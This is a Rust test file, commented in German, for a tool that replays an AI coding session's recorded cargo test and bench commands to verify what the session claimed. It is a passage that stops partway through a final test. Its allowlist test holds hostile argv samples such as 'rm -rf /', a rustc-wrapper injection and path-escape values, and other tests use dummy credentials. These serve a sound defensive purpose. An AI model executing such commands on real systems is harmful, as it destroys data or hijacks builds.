//! `minds replay` ohne echte Prozesse: Ein Fake-[`Spawner`] hält fest, was
//! gestartet würde — und belegt so, was **nie** gestartet wird.

use std::path::Path;
use std::time::Duration;

use minds_core::replay::ReplayPolicy;
use minds_core::replay::{Expected, Observed, ReplayRecord, ReplayVerdict};
use minds_core::{
    Agent, BenchValue, ExecClass, ExecOutcome, Intent, Model, Role, Session, SessionId, TestCounts,
    ToolCall, Turn,
};

use super::*;

/// Der Commit, den die simulierte Pipeline baut.
const HEAD_SHA: &str = "0123456789abcdef0123456789abcdef01234567";

const POLICY: &str = r#"{"schema":1,"runners":{"cargo-test":{"argv0":"cargo","sub":["test","nextest"],"allow_flags":["-p","--package","--release","--lib","--test","--","--exact"]},"cargo-bench":{"argv0":"cargo","sub":["bench"],"allow_flags":["--bench"]}},"tolerance":{"default_pct":25,"overrides":[{"bench":"sort/*","pct":15}]},"timeouts":{"per_command_s":600,"total_s":1800}}"#;

fn argv(items: &[&str]) -> Vec<String> {
    items.iter().map(|s| s.to_string()).collect()
}

fn policy() -> ReplayPolicy {
    ReplayPolicy::parse(POLICY.as_bytes()).unwrap()
}

fn test_outcome(command: &[&str], passed: u64, cwd: Option<&str>) -> ExecOutcome {
    ExecOutcome {
        class: ExecClass::Test,
        runner: "cargo-test".into(),
        command: argv(command),
        cwd: cwd.map(str::to_owned),
        exit_code: None,
        tests: Some(TestCounts {
            passed,
            failed: 0,
            ignored: 0,
        }),
        benches: Vec::new(),
    }
}

fn session_with(outcomes: Vec<ExecOutcome>) -> Session {
    let mut session = Session::new(
        Agent {
            name: "claude-code".into(),
            version: "1".into(),
        },
        Model {
            provider: "anthropic".into(),
            id: "m".into(),
        },
        Intent::default(),
    );
    for outcome in outcomes {
        session.turns.push(Turn {
            role: Role::Assistant,
            text: String::new(),
            tool_calls: vec![ToolCall {
                name: "Bash".into(),
                arguments: String::new(),
                capture: None,
                effect: None,
                outcome: Some(outcome),
            }],
            parent: None,
            at: None,
        });
    }
    session
}

/// libtest-Ausgabe, wie `cargo test` sie schreibt.
fn libtest(passed: u64, failed: u64) -> String {
    let word = if failed == 0 { "ok" } else { "FAILED" };
    format!(
        "   Compiling sort v0.1.0\n     Running unittests src/lib.rs (target/debug/deps/sort-1)\n\n\
         running {}\ntest result: {word}. {passed} passed; {failed} failed; 0 ignored; 0 measured; \
         0 filtered out; finished in 0.01s\n",
        passed + failed
    )
}

/// Die vorbereitete Antwort eines [`Fake`].
type Answer = Box<dyn FnMut(&[String]) -> Ran>;

/// Ein Spawner, der nur festhält und eine vorbereitete Antwort gibt.
struct Fake {
    calls: Vec<(Vec<String>, std::path::PathBuf, Duration)>,
    answer: Answer,
}

impl Fake {
    fn answering(answer: impl FnMut(&[String]) -> Ran + 'static) -> Self {
        Self {
            calls: Vec::new(),
            answer: Box::new(answer),
        }
    }

    fn never() -> Self {
        Self::answering(|argv| panic!("must never run: {argv:?}"))
    }
}

impl Spawner for Fake {
    fn spawn(&mut self, invocation: &Invocation<'_>) -> std::io::Result<Ran> {
        self.calls.push((
            invocation.argv.to_vec(),
            invocation.cwd.to_path_buf(),
            invocation.timeout,
        ));
        Ok((self.answer)(invocation.argv))
    }
}

fn ok(output: String, exit_code: i32) -> Ran {
    Ran {
        output,
        exit_code: Some(exit_code),
        timed_out: false,
        lingering: false,
        truncated: false,
    }
}

/// Ein Checkout mit `crates/sort`, eine Session, ein Lauf.
fn run_with(
    session: &Session,
    policy: &ReplayPolicy,
    spawner: &mut Fake,
    prepare: impl FnOnce(&Path),
) -> ReplayRecord {
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join("crates/sort")).unwrap();
    std::fs::create_dir_all(dir.path().join(".git")).unwrap();
    prepare(dir.path());
    let inputs = Inputs {
        checkout: dir.path(),
        policy,
        env: Vec::new(),
        git_dirs: vec![std::fs::canonicalize(dir.path().join(".git")).unwrap()],
        redaction: None,
        tracked: None,
    };
    let id = SessionId::of(session).unwrap();
    replay_session(
        &inputs,
        id,
        session,
        &"ab".repeat(20),
        spawner,
        &mut Budget::new(Duration::from_secs(policy.timeouts.total_s)),
    )
    .unwrap()
}

fn verdicts(record: &ReplayRecord) -> Vec<(ReplayVerdict, Option<&str>)> {
    record
        .results
        .iter()
        .map(|r| (r.verdict, r.reason.as_deref()))
        .collect()
}

#[test]
fn replay_reproduces_passing_tests() {
    let session = session_with(vec![test_outcome(
        &["cargo", "test", "-p", "sort"],
        12,
        Some("crates/sort"),
    )]);
    let mut fake = Fake::answering(|_| ok(libtest(12, 0), 0));
    let record = run_with(&session, &policy(), &mut fake, |_| {});
    assert_eq!(verdicts(&record), vec![(ReplayVerdict::Reproduced, None)]);
    assert_eq!(
        record.results[0].observed,
        Some(Observed {
            exit_code: Some(0),
            tests: Some(TestCounts {
                passed: 12,
                failed: 0,
                ignored: 0
            }),
            ..Observed::default()
        })
    );
    // Genau einmal gestartet, im aufgezeichneten Unterverzeichnis, mit dem
    // Zeitlimit je Befehl.
    assert_eq!(fake.calls.len(), 1);
    let (argv_run, cwd, timeout) = &fake.calls[0];
    assert_eq!(argv_run, &argv(&["cargo", "test", "-p", "sort"]));
    assert!(cwd.ends_with("crates/sort"), "{cwd:?}");
    assert_eq!(*timeout, Duration::from_secs(600));
    assert_eq!(exit_status(std::slice::from_ref(&record)), 0);
}

#[test]
fn replay_detects_false_claim() {
    // Die Session behauptet 12 bestandene Tests, die Wirklichkeit sind 11.
    let session = session_with(vec![test_outcome(&["cargo", "test"], 12, Some("."))]);
    let mut fake = Fake::answering(|_| ok(libtest(11, 0), 0));
    let record = run_with(&session, &policy(), &mut fake, |_| {});
    assert_eq!(
        verdicts(&record),
        vec![(
            ReplayVerdict::NotReproduced,
            Some("tests: recorded 12 passed, observed 11 passed")
        )]
    );
    assert_eq!(exit_status(std::slice::from_ref(&record)), 2);
    assert_eq!(
        summary_lines(std::slice::from_ref(&record)),
        vec![
            "replay   0/1 decisive test runs reproduced (cargo test)",
            "replay   claim not reproduced (tests: recorded 12 passed, observed 11 passed): cargo test",
        ]
    );
}

#[test]
fn replay_never_runs_unlisted() {
    let hostile: &[&[&str]] = &[
        &["rm", "-rf", "/"],
        &["sh", "-c", "cargo test"],
        &["cargo", "+nightly", "test"],
        &["cargo", "test", "--manifest-path", "/tmp/evil/Cargo.toml"],
        &["cargo", "test", "--config", "build.rustc-wrapper=/tmp/x"],
        &["cargo", "test", "-p", "../../etc"],
        &["/usr/bin/cargo", "test"],
        &["cargo", "run"],
    ];
    let session = session_with(
        hostile
            .iter()
            .map(|command| test_outcome(command, 1, Some(".")))
            .collect(),
    );
    let mut fake = Fake::never();
    let record = run_with(&session, &policy(), &mut fake, |_| {});
    assert!(fake.calls.is_empty(), "spawned: {:?}", fake.calls);
    assert_eq!(record.results.len(), hostile.len());
    assert!(
        record
            .results
            .iter()
            .all(|r| r.verdict == ReplayVerdict::Skipped
                && r.reason.as_deref() == Some("not allowlisted")
                && r.observed.is_none())
    );
    assert_eq!(exit_status(std::slice::from_ref(&record)), 0);

    // Ohne Policy im Commit ist auch `cargo test` nicht erlaubt.
    let session = session_with(vec![test_outcome(&["cargo", "test"], 1, Some("."))]);
    let record = run_with(&session, &ReplayPolicy::none(), &mut fake, |_| {});
    assert!(fake.calls.is_empty());
    assert_eq!(
        verdicts(&record),
        vec![(ReplayVerdict::Skipped, Some("not allowlisted"))]
    );
}

#[test]
fn replay_rejects_cwd_escape() {
    let cases = [
        (Some(".."), "cwd outside the checkout"),
        (Some("../sibling"), "cwd outside the checkout"),
        (Some("crates/../../x"), "cwd outside the checkout"),
        (Some("/etc"), "cwd outside the checkout"),
        (Some("/home/anna/project"), "cwd outside the checkout"),
        (Some(".git"), "cwd outside the checkout"),
        (Some(".git/hooks"), "cwd outside the checkout"),
        (Some("missing/dir"), "cwd not in the checkout"),
        (None, "cwd not recorded"),
    ]
    .into_iter()
    // Die Symlinks `escape -> /` und `tools -> .git` entstehen nur unter
    // Unix (unten): lexikalisch innen, aufgelöst draußen bzw. im
    // Git-Verzeichnis.
    .chain(cfg!(unix).then_some((Some("escape"), "cwd outside the checkout")))
    .chain(cfg!(unix).then_some((Some("tools"), "cwd outside the checkout")))
    .chain(cfg!(unix).then_some((Some("tools/hooks"), "cwd outside the checkout")));
    for (cwd, reason) in cases {
        // Je Fall eine eigene Session mit einem einzigen Befehl.
        let session = session_with(vec![test_outcome(&["cargo", "test"], 1, cwd)]);
        let mut fake = Fake::never();
        let record = run_with(&session, &policy(), &mut fake, |root| {
            // Ein Symlink im Checkout, der hinauszeigt: lexikalisch innen,
            // aufgelöst draußen.
            #[cfg(unix)]
            {
                std::os::unix::fs::symlink("/", root.join("escape")).unwrap();
                std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
                std::os::unix::fs::symlink(".git", root.join("tools")).unwrap();
            }
            let _ = root;
        });
        assert!(fake.calls.is_empty(), "{cwd:?} spawned");
        assert_eq!(
            verdicts(&record),
            vec![(ReplayVerdict::Skipped, Some(reason))],
            "{cwd:?}"
        );
    }
}

#[test]
fn replay_bench_tolerance() {
    let session = session_with(vec![ExecOutcome {
        class: ExecClass::Bench,
        runner: "cargo-bench-criterion".into(),
        command: argv(&["cargo", "bench", "--bench", "sort"]),
        cwd: Some(".".into()),
        exit_code: None,
        tests: None,
        benches: vec![BenchValue {
            name: "sort/10k".into(),
            value: 1000,
            unit: "ns".into(),
        }],
    }]);
    let criterion = |ns: &str| {
        format!(
            "     Running benches/sort.rs (target/release/deps/sort-1)\n\
             Benchmarking sort/10k: Analyzing\n\
             sort/10k                time:   [{ns} ns {ns} ns {ns} ns]\n"
        )
    };
    for (seen, verdict) in [
        ("1150", ReplayVerdict::Reproduced),
        ("851", ReplayVerdict::Reproduced),
        ("1151", ReplayVerdict::NotReproduced),
        ("849", ReplayVerdict::NotReproduced),
    ] {
        let output = criterion(seen);
        let mut fake = Fake::answering(move |_| ok(output.clone(), 0));
        let record = run_with(&session, &policy(), &mut fake, |_| {});
        assert_eq!(record.results[0].verdict, verdict, "{seen} ns");
    }
}

#[test]
fn only_directories_the_commit_tracks_are_a_cwd() {
    // `target/` liegt im Checkout, trägt aber keinen reviewten Code — etwa
    // aus einem CI-Cache.
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join("crates/sort")).unwrap();
    std::fs::create_dir_all(dir.path().join("target/debug")).unwrap();
    let policy = policy();
    let inputs = Inputs {
        checkout: dir.path(),
        policy: &policy,
        env: Vec::new(),
        git_dirs: Vec::new(),
        redaction: None,
        tracked: Some(
            [".", "crates", "crates/sort"]
                .map(str::to_owned)
                .into_iter()
                .collect(),
        ),
    };
    // Ein getrackter Name, der (nach einem früheren Befehl) als Symlink
    // in `target/` zeigt: Maßgeblich ist der aufgelöste Ort.
    #[cfg(unix)]
    std::os::unix::fs::symlink("../target/debug", dir.path().join("crates/linked")).unwrap();
    let mut inputs = inputs;
    if let Some(tracked) = inputs.tracked.as_mut() {
        tracked.insert("crates/linked".into());
    }
    let cases = [
        ("target/debug", Some("cwd not tracked by the commit")),
        ("crates/sort", None),
    ]
    .into_iter()
    .chain(cfg!(unix).then_some(("crates/linked", Some("cwd not tracked by the commit"))));
    for (cwd, expected) in cases {
        let session = session_with(vec![test_outcome(&["cargo", "test"], 1, Some(cwd))]);
        let mut fake = Fake::answering(|_| ok(libtest(1, 0), 0));
        let record = replay_session(
            &inputs,
            SessionId::of(&session).unwrap(),
            &session,
            "c",
            &mut fake,
            &mut Budget::new(Duration::from_secs(60)),
        )
        .unwrap();
        match expected {
            Some(reason) => {
                assert!(fake.calls.is_empty(), "{cwd} spawned");
                assert_eq!(
                    verdicts(&record),
                    vec![(ReplayVerdict::Skipped, Some(reason))]
                );
            }
            None => assert_eq!(verdicts(&record), vec![(ReplayVerdict::Reproduced, None)]),
        }
    }
}

#[test]
fn a_runner_other_than_the_recorded_one_is_skipped() {
    // Die Session nennt `pytest` als Runner, das argv ist `cargo test`: Der
    // Parser deutete eine andere Ausgabe als beim Checkpoint.
    let mut outcome = test_outcome(&["cargo", "test"], 1, Some("."));
    outcome.runner = "pytest".into();
    let session = session_with(vec![outcome]);
    let mut fake = Fake::never();
    let record = run_with(&session, &policy(), &mut fake, |_| {});
    assert_eq!(
        verdicts(&record),
        vec![(
            ReplayVerdict::Skipped,
            Some("runner differs from the recorded one")
        )]
    );
}

#[test]
fn an_exhausted_time_budget_skips_the_rest() {
    let session = session_with(vec![test_outcome(&["cargo", "test"], 1, Some("."))]);
    let dir = tempfile::tempdir().unwrap();
    let policy = policy();
    let inputs = Inputs {
        checkout: dir.path(),
        policy: &policy,
        env: Vec::new(),
        git_dirs: Vec::new(),
        redaction: None,
        tracked: None,
    };
    let mut fake = Fake::never();
    let record = replay_session(
        &inputs,
        SessionId::of(&session).unwrap(),
        &session,
        "c",
        &mut fake,
        &mut Budget::new(Duration::ZERO),
    )
    .unwrap();
    assert_eq!(
        verdicts(&record),
        vec![(ReplayVerdict::Skipped, Some("total time budget exhausted"))]
    );

    // Kürzt das Restbudget das Zeitlimit und läuft der Befehl hinein, ist
    // das keine Aussage über die Behauptung: übersprungen, nie `not
    // reproduced` (sonst stünde ein signierter Fehlschlag für immer da).
    let mut fake = Fake::answering(|_| Ran {
        output: String::new(),
        exit_code: None,
        timed_out: true,
        lingering: false,
        truncated: false,
    });
    let record = replay_session(
        &inputs,
        SessionId::of(&session).unwrap(),
        &session,
        "c",
        &mut fake,
        &mut Budget::new(Duration::from_secs(1)),
    )
    .unwrap();
    assert_eq!(fake.calls.len(), 1);
    assert!(fake.calls[0].2 <= Duration::from_secs(1));
    assert_eq!(
        verdicts(&record),
        vec![(ReplayVerdict::Skipped, Some("total time budget exhausted"))]
    );
}

#[test]
fn a_process_that_outlives_a_confirmed_command_is_only_a_gap() {
    let session = session_with(vec![test_outcome(&["cargo", "test"], 12, Some("."))]);
    let mut fake = Fake::answering(|_| Ran {
        lingering: true,
        ..ok(libtest(12, 0), 0)
    });
    let record = run_with(&session, &policy(), &mut fake, |_| {});
    // Die Zahlen stimmen; der Prozess, der die Ausgabe hielt, ist eine
    // Lücke dieses Laufs, kein Beleg gegen die Behauptung.
    assert_eq!(
        verdicts(&record),
        vec![(
            ReplayVerdict::Skipped,
            Some("a process outlived the command")
        )]
    );
    // Ein klarer Fehlschlag bleibt einer.
    let mut fake = Fake::answering(|_| Ran {
        lingering: true,
        ..ok(libtest(11, 0), 0)
    });
    let record = run_with(&session, &policy(), &mut fake, |_| {});
    assert_eq!(record.results[0].verdict, ReplayVerdict::NotReproduced);
    // Abgeschnittene Ausgabe: ebenso nur eine Lücke.
    let mut fake = Fake::answering(|_| Ran {
        truncated: true,
        ..ok(libtest(11, 0), 0)
    });
    let record = run_with(&session, &policy(), &mut fake, |_| {});
    assert_eq!(
        verdicts(&record),
        vec![(ReplayVerdict::Skipped, Some("output truncated"))]
    );
    // Ein falscher Exit-Code hängt nicht an der Ausgabe: bleibt ein Befund.
    let mut fake = Fake::answering(|_| Ran {
        truncated: true,
        ..ok(libtest(11, 0), 101)
    });
    let record = run_with(&session, &policy(), &mut fake, |_| {});
    assert_eq!(record.results[0].verdict, ReplayVerdict::NotReproduced);
}

#[test]
fn signing_is_refused_in_review_pipelines() {
    let dir = tempfile::tempdir().unwrap();
    let key = dir.path().join("key");
    std::fs::write(&key, "not a real key").unwrap();
    let key = key.to_str().unwrap().to_owned();
    for (name, value) in [
        ("CI_MERGE_REQUEST_IID", "42"),
        ("CI_PIPELINE_SOURCE", "merge_request_event"),
        ("GITHUB_EVENT_NAME", "pull_request"),
        ("GITHUB_EVENT_NAME", "pull_request_target"),
        ("GITHUB_EVENT_NAME", "pull_request_review"),
        ("CI_PIPELINE_SOURCE", "external_pull_request_event"),
        ("CI_EXTERNAL_PULL_REQUEST_IID", "7"),
        ("GITHUB_EVENT_NAME", "workflow_run"),
        ("CI_PIPELINE_SOURCE", "trigger"),
        ("CI_PIPELINE_SOURCE", "api"),
        ("CI_PIPELINE_SOURCE", "parent_pipeline"),
    ] {
        let var = |asked: &str| match asked {
            KEY_ENV => Some(key.clone()),
            "PATH" => Some("/usr/bin:/bin".into()),
            _ if asked == name => Some(value.into()),
            _ => None,
        };
        let err = signing_key(&var, dir.path(), HEAD_SHA)
            .err()
            .expect(name)
            .to_string();
        assert!(err.contains("refusing to sign"), "{name}: {err}");
    }
    // Ohne Schlüssel: der bekannte Hinweis auf --unsigned.
    let err = signing_key(&|_| None, dir.path(), HEAD_SHA)
        .err()
        .unwrap()
        .to_string();
    assert!(err.contains("--unsigned"), "{err}");

    // Kein Merge Request, aber auch kein geschützter Ref (ein beliebiger
    // Branch, lokal): nicht signiert.
    let checkout = tempfile::tempdir().unwrap();
    let unprotected = |asked: &str| match asked {
        KEY_ENV => Some(key.clone()),
        "PATH" => Some("/usr/bin:/bin".into()),
        _ => None,
    };
    let err = signing_key(&unprotected, checkout.path(), HEAD_SHA)
        .err()
        .unwrap()
        .to_string();
    assert!(err.contains("protected ref"), "{err}");
    let gitlab_unprotected = |asked: &str| match asked {
        KEY_ENV => Some(key.clone()),
        "PATH" => Some("/usr/bin:/bin".into()),
        "GITLAB_CI" => Some("true".into()),
        _ => None,
    };
    let err = signing_key(&gitlab_unprotected, checkout.path(), HEAD_SHA)
        .err()
        .unwrap()
        .to_string();
    assert!(err.contains("does not run on a protected ref"), "{err}");

    // Ein Schlüssel im Checkout: Der Commit hätte ihn lesen können.
    let inside = checkout.path().join("ci.key");
    std::fs::write(&inside, "not a real key").unwrap();
    let inside = inside.to_str().unwrap().to_owned();
    let protected_inside = |asked: &str| match asked {
        KEY_ENV => Some(inside.clone()),
        "PATH" => Some("/usr/bin:/bin".into()),
        "CI_COMMIT_REF_PROTECTED" => Some("true".into()),
        "CI_COMMIT_SHA" => Some(HEAD_SHA.into()),
        "CI_PIPELINE_SOURCE" => Some("push".into()),
        "GITLAB_CI" => Some("true".into()),
        _ => None,
    };
    let err = signing_key(&protected_inside, checkout.path(), HEAD_SHA)
        .err()
        .unwrap()
        .to_string();
    assert!(err.contains("points into the checkout"), "{err}");
}

#[test]
fn signing_is_bound_to_the_sha_and_push_like_events() {
    let checkout = tempfile::tempdir().unwrap();
    let keys = tempfile::tempdir().unwrap();
    let key = keys.path().join("ci");
    std::fs::write(&key, "not a real key").unwrap();
    let key = key.to_str().unwrap().to_owned();
    let refused = |extra: &[(&str, &str)]| {
        let extra: Vec<(String, String)> = extra
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect();
        let var = |asked: &str| match asked {
            KEY_ENV => Some(key.clone()),
            "PATH" => Some("/usr/bin:/bin".into()),
            _ => extra
                .iter()
                .find(|(k, _)| k == asked)
                .map(|(_, v)| v.clone()),
        };
        signing_key(&var, checkout.path(), HEAD_SHA)
            .err()
            .map(|err| err.to_string())
    };
    // Geschützter Ref, aber ein anderer Commit ausgecheckt (`issue_comment`
    // mit `ref: <PR head>`).
    let err = refused(&[
        ("GITHUB_ACTIONS", "true"),
        ("GITHUB_REF_PROTECTED", "true"),
        ("GITHUB_SHA", "ffffffffffffffffffffffffffffffffffffffff"),
        ("GITHUB_EVENT_NAME", "push"),
    ])
    .unwrap();
    assert!(err.contains("not the commit of the protected ref"), "{err}");
    let err = refused(&[
        ("GITLAB_CI", "true"),
        ("CI_COMMIT_REF_PROTECTED", "true"),
        ("CI_COMMIT_SHA", "ffffffffffffffffffffffffffffffffffffffff"),
    ])
    .unwrap();
    assert!(err.contains("not the commit of the protected ref"), "{err}");
    // Richtige SHA, aber ein Ereignis, dessen Checkout nicht der Ref ist.
    let err = refused(&[
        ("GITHUB_ACTIONS", "true"),
        ("GITHUB_REF_PROTECTED", "true"),
        ("GITHUB_SHA", HEAD_SHA),
        ("GITHUB_EVENT_NAME", "issue_comment"),
    ])
    .unwrap();
    assert!(err.contains("pipeline source issue_comment"), "{err}");
    // Alles passt: Weiter geht es erst an `ssh-keygen` (hier vorhanden) —
    // kein Gate-Fehler mehr.
    // Die SHA der jeweils anderen Plattform zählt nicht: Auf GitHub
    // überschriebe ein im Job gesetztes `CI_COMMIT_SHA` sonst `GITHUB_SHA`.
    let err = refused(&[
        ("GITHUB_ACTIONS", "true"),
        ("GITHUB_REF_PROTECTED", "true"),
        ("GITHUB_SHA", "ffffffffffffffffffffffffffffffffffffffff"),
        ("CI_COMMIT_SHA", HEAD_SHA),
        ("GITHUB_EVENT_NAME", "push"),
    ])
    .unwrap();
    assert!(err.contains("not the commit of the protected ref"), "{err}");
    // Keine oder zwei Plattformen: nicht signiert.
    let err = refused(&[
        ("CI_COMMIT_REF_PROTECTED", "true"),
        ("CI_COMMIT_SHA", HEAD_SHA),
    ])
    .unwrap();
    assert!(err.contains("exactly one recognised CI"), "{err}");
    // GitLab: nur `push`/`schedule` — ein `web`-Lauf bringt Variablen mit.
    for source in [
        None,
        Some("web"),
        Some("api"),
        Some("schedule"),
        Some("chat"),
    ] {
        let mut pairs = vec![
            ("GITLAB_CI", "true"),
            ("CI_COMMIT_REF_PROTECTED", "true"),
            ("CI_COMMIT_SHA", HEAD_SHA),
        ];
        pairs.extend(source.map(|s| ("CI_PIPELINE_SOURCE", s)));
        let err = refused(&pairs).unwrap();
        assert!(err.contains("refusing"), "{source:?}: {err}");
    }
    // GitHub ohne Event: nein.
    let err = refused(&[
        ("GITHUB_ACTIONS", "true"),
        ("GITHUB_REF_PROTECTED", "true"),
        ("GITHUB_SHA", HEAD_SHA),
    ])
    .unwrap();
    assert!(err.contains("pipeline source (unset)"), "{err}");
    // Alles passt — dann scheitert erst die Probesignatur des
    // (unechten) Schlüssels, bevor irgendein Befehl liefe.
    let ok = refused(&[
        ("GITLAB_CI", "true"),
        ("CI_COMMIT_REF_PROTECTED", "true"),
        ("CI_COMMIT_SHA", HEAD_SHA),
        ("CI_PIPELINE_SOURCE", "push"),
    ]);
    let ok = ok.unwrap();
    assert!(ok.contains("the anchor key cannot sign"), "{ok}");
}

#[test]
fn the_project_identity_is_checked() {
    let vars = |pairs: &'static [(&'static str, &'static str)]| {
        move |name: &str| {
            pairs
                .iter()
                .find(|(k, _)| *k == name)
                .map(|(_, v)| (*v).to_owned())
        }
    };
    assert_eq!(
        ci_project(vars(&[
            ("GITLAB_CI", "true"),
            ("CI_SERVER_HOST", "gitlab.example.com"),
            ("CI_PROJECT_PATH", "group/repo"),
        ]))
        .as_deref(),
        Some("gitlab.example.com/group/repo")
    );
    assert_eq!(
        ci_project(vars(&[
            ("GITHUB_ACTIONS", "true"),
            ("GITHUB_SERVER_URL", "https://github.com"),
            ("GITHUB_REPOSITORY", "org/repo"),
        ]))
        .as_deref(),
        Some("github.com/org/repo")
    );
    assert_eq!(
        ci_project(vars(&[
            ("GITLAB_CI", "true"),
            ("CI_SERVER_HOST", "user:pw@gitlab.example.com"),
            ("CI_PROJECT_PATH", "group/repo"),
        ])),
        None
    );
    assert_eq!(ci_project(vars(&[])), None);
}

#[test]
fn a_redactable_argv_is_never_executed() {
    let session = session_with(vec![test_outcome(
        &["cargo", "test", "--", "--password", "hunter2"],
        1,
        Some("."),
    )]);
    let dir = tempfile::tempdir().unwrap();
    let mut policy = policy();
    policy
        .runners
        .get_mut("cargo-test")
        .unwrap()
        .allow_flags
        .push("--password".into());
    let redaction = minds_redact::RedactionConfig::default().pipeline().unwrap();
    let inputs = Inputs {
        checkout: dir.path(),
        policy: &policy,
        env: Vec::new(),
        git_dirs: Vec::new(),
        redaction: Some(&redaction),
        tracked: None,
    };
    let mut fake = Fake::never();
    let record = replay_session(
        &inputs,
        SessionId::of(&session).unwrap(),
        &session,
        "c",
        &mut fake,
        &mut Budget::new(Duration::from_secs(60)),
    )
    .unwrap();
    assert!(fake.calls.is_empty());
    // Weder ausgeführt noch im Record: Stünde das argv dort, lehnte
    // `scan_replay` den ganzen Record ab.
    assert!(record.results.is_empty(), "{:?}", record.results);
}

#[test]
fn a_bench_name_cannot_suppress_a_false_claim_through_its_reason() {
    // Ein Bench namens `password`, der in der Ausgabe fehlt: Sein Grund
    // darf den Namen nicht tragen (`bench password: missing` läse die
    // Redaction als Schlüssel-Wert-Paar und verwürfe den ganzen Record).
    let bench = ExecOutcome {
        class: ExecClass::Bench,
        runner: "cargo-bench-criterion".into(),
        command: argv(&["cargo", "bench"]),
        cwd: Some(".".into()),
        exit_code: None,
        tests: None,
        benches: vec![BenchValue {
            name: "password".into(),
            value: 1000,
            unit: "ns".into(),
        }],
    };
    let session = session_with(vec![test_outcome(&["cargo", "test"], 12, Some(".")), bench]);
    let dir = tempfile::tempdir().unwrap();
    let redaction = minds_redact::RedactionConfig::default().pipeline().unwrap();
    let policy = policy();
    let inputs = Inputs {
        checkout: dir.path(),
        policy: &policy,
        env: Vec::new(),
        git_dirs: Vec::new(),
        redaction: Some(&redaction),
        tracked: None,
    };
    let mut fake = Fake::answering(|argv| {
        if argv[1] == "bench" {
            ok(
                "     Running benches/x.rs (target/release/deps/x-1)\n".into(),
                0,
            )
        } else {
            ok(libtest(11, 0), 0)
        }
    });
    let record = replay_session(
        &inputs,
        SessionId::of(&session).unwrap(),
        &session,
        &"ab".repeat(20),
        &mut fake,
        &mut Budget::new(Duration::from_secs(60)),
    )
    .unwrap();
    let scanned = redaction.scan_replay(record).unwrap();
    let verdicts: Vec<ReplayVerdict> = scanned.record().results.iter().map(|r| r.verdict).collect();
    assert!(
        verdicts.contains(&ReplayVerdict::NotReproduced),
        "{verdicts:?}"
    );
    assert_eq!(exit_status(std::slice::from_ref(scanned.record())), 2);
}

#[test]
fn a_redactable_command_cannot_suppress_a_false_claim() {
    // Ein untergeschobenes Envelope: ein falscher Claim (12 statt 11) und
    // daneben ein Befehl mit Geheimnis im argv. Der Fehlschlag muss
    // ablegbar bleiben.
    let session = session_with(vec![
        test_outcome(&["cargo", "test"], 12, Some(".")),
        test_outcome(
            &["cargo", "test", "--", "--password", "hunter2"],
            1,
            Some("."),
        ),
    ]);
    let dir = tempfile::tempdir().unwrap();
    let mut policy = policy();
    policy
        .runners
        .get_mut("cargo-test")
        .unwrap()
        .allow_flags
        .push("--password".into());
    let redaction = minds_redact::RedactionConfig::default().pipeline().unwrap();
    let inputs = Inputs {
        checkout: dir.path(),
        policy: &policy,
        env: Vec::new(),
        git_dirs: Vec::new(),
        redaction: Some(&redaction),
        tracked: None,
    };
    let mut fake = Fake::answering(|_| ok(libtest(11, 0), 0));
    let record = replay_session(
        &inputs,
        SessionId::of(&session).unwrap(),
        &session,
        &"ab".repeat(20),
        &mut fake,
        &mut Budget::new(Duration::from_secs(60)),
    )
    .unwrap();
    assert_eq!(fake.calls.len(), 1);
    let scanned = redaction.scan_replay(record).unwrap();
    assert_eq!(
        verdicts(scanned.record()),
        vec![(
            ReplayVerdict::NotReproduced,
            Some("tests: recorded 12 passed, observed 11 passed")
        )]
    );
    // Der Record deckt die Session nicht ab: kein A3.
    let summary = minds_reader::replay::summarize(
        SessionId::of(&session).unwrap(),
        &session,
        &"ab".repeat(20),
        scanned.record(),
        true,
    )
    .unwrap();
    assert_eq!((summary.decisive, summary.not_reproduced), (2, 1));
}

#[test]
fn output_keeps_head_and_tail_and_reports_the_cut() {
    let mut kept = Kept::default();
    kept.push(b"head line\n");
    assert!(!kept.dropped);
    assert_eq!(kept.text(), "head line\n");
    // In ungleichen Stücken über die Grenze: Der Anfang bleibt, das Ende
    // bleibt, die Mitte fällt — und das wird gemeldet.
    let filler = vec![b'x'; 300 * 1024];
    let mut pushed = 10;
    while pushed < MAX_OUTPUT + 512 * 1024 {
        kept.push(&filler);
        pushed += filler.len();
    }
    kept.push(b"\ntest result: ok. 3 passed; 0 failed; 0 ignored\n");
    assert!(kept.dropped);
    assert_eq!(kept.head.len(), OUTPUT_HEAD);
    assert_eq!(kept.tail.len(), MAX_OUTPUT - OUTPUT_HEAD);
    let text = kept.text();
    assert!(text.starts_with("head line\n"));
    assert!(text.ends_with("test result: ok. 3 passed; 0 failed; 0 ignored\n"));
    assert_eq!(text.len(), MAX_OUTPUT + 1, "plus the separating newline");
}

/// Ein Spawner, dessen Programm sich nie starten lässt.
struct Missing;

impl Spawner for Missing {
    fn spawn(&mut self, _: &Invocation<'_>) -> std::io::Result<Ran> {
        Err(std::io::Error::from(std::io::ErrorKind::NotFound))
    }
}

#[test]
fn a_program_that_cannot_start_skips_only_its_command() {
    // Ein untergeschobener, freigegebener, aber nicht installierter Befehl
    // darf den Lauf der übrigen nicht verhindern.
    let session = session_with(vec![test_outcome(&["cargo", "test"], 1, Some("."))]);
    let dir = tempfile::tempdir().unwrap();
    let policy = policy();
    let inputs = Inputs {
        checkout: dir.path(),
        policy: &policy,
        env: Vec::new(),
        git_dirs: Vec::new(),
        redaction: None,
        tracked: None,
    };
    let record = replay_session(
        &inputs,
        SessionId::of(&session).unwrap(),
        &session,
        "c",
        &mut Missing,
        &mut Budget::new(Duration::from_secs(60)),
    )
    .unwrap();
    assert_eq!(
        verdicts(&record),
        vec![(ReplayVerdict::Skipped, Some("command could not be run"))]
    );
}

#[test]
fn userinfo_is_caught_leniently() {
    for value in [
        "http://user:hunter2@proxy:3128",
        "postgres://app:s3cr/et@db.internal:5432/prod",
        "http://proxyuser:pa#ss@proxy.corp:3128",
        "proxyuser:pa/ss@proxy.corp:3128",
        "alice:S3cr3t@proxy:3128",
    ] {
        assert!(url_with_userinfo(value), "{value}");
    }
    for value in [
        "sparse+https://index.crates.io/",
        "git@github.com:org/repo.git",
        "/opt/cargo",
        "stable",
    ] {
        assert!(!url_with_userinfo(value), "{value}");
    }
}

#[test]
fn ssh_keygen_is_resolved_only_under_absolute_path_entries() {
    let dir = tempfile::tempdir().unwrap();
